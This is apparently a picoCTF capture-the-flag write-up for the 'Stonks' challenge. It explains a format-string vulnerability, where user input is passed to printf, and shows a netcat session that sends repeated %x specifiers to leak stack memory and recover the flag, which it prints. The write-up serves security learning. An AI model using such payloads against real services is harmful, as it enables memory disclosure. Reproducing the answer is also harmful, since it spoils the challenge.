# Stonks

- [Description](#description)
- [Approach](#approach)
- [Flag](#flag)

## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`

## Approach

Analysing the code, it appears that the flag is being stored in `api_buf` variable inside the `buy_stonks` function. To read this local variable. there is only 1 location for my input to be read.

```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

With the vulnerable `printf` function, we can make use of string formatters to read values from the stack, which will also store the flag in the `api_buf` variable. `%x` is a type of string formatter for hexadecimal representation. Sending many `%x` will allow me to read values from the stack, represented in hexdecimal. 

```
$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
97ad450804b00080489c3f7f87d80ffffffff197ab160f7f95110f7f87dc7097ac180197ad43097ad4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffee007d
```

Converting the result from hexadecimal to ASCII using [Cyberchef](https://cyberchef.org/#recipe=From_Hex('Auto')&input=OTdhZDQ1MDgwNGIwMDA4MDQ4OWMzZjdmODdkODBmZmZmZmZmZjE5N2FiMTYwZjdmOTUxMTBmN2Y4N2RjNzA5N2FjMTgwMTk3YWQ0MzA5N2FkNDUwNmY2MzY5NzA3YjQ2NTQ0MzMwNmM1ZjQ5MzQ1Zjc0MzU2ZDVmNmM2YzMwNmQ1Zjc5NWY3OTMzNmU2MjYzMzc2MzY1NjE2MzM2ZmZlZTAwN2Q), it seems that I need to swap the endianness to obtain the flag. 

<p align="center">
  <img src="https://raw.githubusercontent.com/DarrenPea/picoCTF_writeups/refs/heads/main/picoCTF-2021/Binary-Exploitation/Stonks/img/endian.png" />
</p>

## Flag

`picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}`